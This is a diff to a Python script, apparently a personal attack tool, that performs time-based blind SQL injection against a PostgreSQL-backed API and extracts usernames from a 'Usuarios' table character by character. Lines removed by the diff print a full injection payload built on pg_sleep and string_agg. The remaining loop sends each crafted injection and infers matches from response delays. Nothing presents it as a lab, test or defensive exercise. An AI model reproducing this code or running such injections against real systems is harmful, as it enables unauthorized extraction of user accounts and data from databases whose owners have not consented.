@@ -6,7 +6,6 @@ import signal
 from termcolor import colored
 import dic_inyecciones_for_scripts as dic
 
-
 # controlar CTRL+C
 def signal_handler(sig, frame):
     print('\nYou pressed Ctrl+C!')
@@ -66,16 +65,12 @@ def main():
 
             for letra in conjunto_car:
                 tiempo_inicial = time.time()
-                print(
-                    f"\nPalabra: {palabra + letra}\nINYECCION ANTIGUA: {inyeccion}\nTIPO DE INYECCION:{type(inyeccion)}")
-                print(
-                    str(inyeccion) == "' AND ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), {i}) <> '{p}' OR ( LEFT((SELECT string_agg(username, ',') FROM Usuarios), {i}) = '{p}' AND ( SELECT NULL FROM pg_sleep(2) ) IS NULL ) ) --")
+
                 nueva_inyeccion = dic.transformar_inyeccion(inyeccion, palabra + letra, len(palabra) + 1)
-                print(nueva_inyeccion)
                 llamada_api(nueva_inyeccion)
+
                 tiempo_final = time.time()
                 tiempo_total = tiempo_final - tiempo_inicial
-                inyeccion = nueva_inyeccion
 
                 spinner.text = f"Extrayendo usuarios de la BD: {palabra + letra}"
                 if tiempo_total > 1:
